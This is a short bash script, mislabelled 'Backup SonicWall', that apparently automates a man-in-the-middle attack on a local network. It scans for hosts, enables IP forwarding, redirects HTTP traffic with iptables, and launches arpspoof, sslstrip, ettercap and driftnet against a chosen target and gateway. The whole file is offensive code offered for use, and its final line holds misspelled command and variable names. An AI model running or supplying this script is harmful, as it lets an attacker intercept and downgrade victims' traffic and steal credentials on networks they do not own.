#!/bin/bash

#-------------------------------------------#
#-- Backup SonicWall -----------------------#
#-- by: @cryptobr - on Telegram ------------#
#-------------------------------------------#

# Clear Terminal
clear

# Input dates
echo "Tell the network you are running a scanner to:  "
echo "EX: 192.168.0.0/24 "
read NET
netdiscover -r $NET -P

echo "#####################################################################"
sleep 2
echo "Informe a interface de rede que está utilizando no momento:  "
echo "EX: eth0, wlan0"
read INTERFACE
echo "Input IP to Target"
read IP_TARGET
echo "Input  Gateway"
read GW

# Enable roting
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "Routing enabled !"
sleep 1

# Create redirect
iptables  -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 7777
echo "Redirect ok"
sleep 1

# Open terminal with arpspoof 
gnome-terminal -x sh -c "arpspoof -i $INTERFACE -t $IP_TARGET $GW; exec bash"

# Open terminal with sslstrip
gnome-terminal -x sh -c "sslstrip -l 7777; exec bash"

# Open terminal with ettercap
gnome-terminal -x sh -c "ettercap -Tq -i $INTERFACE; exec bash";

# Open terminal with DriftNet
gnome-terminal -x sh -c "driftinet -i $INTERNFACE; exec bash";
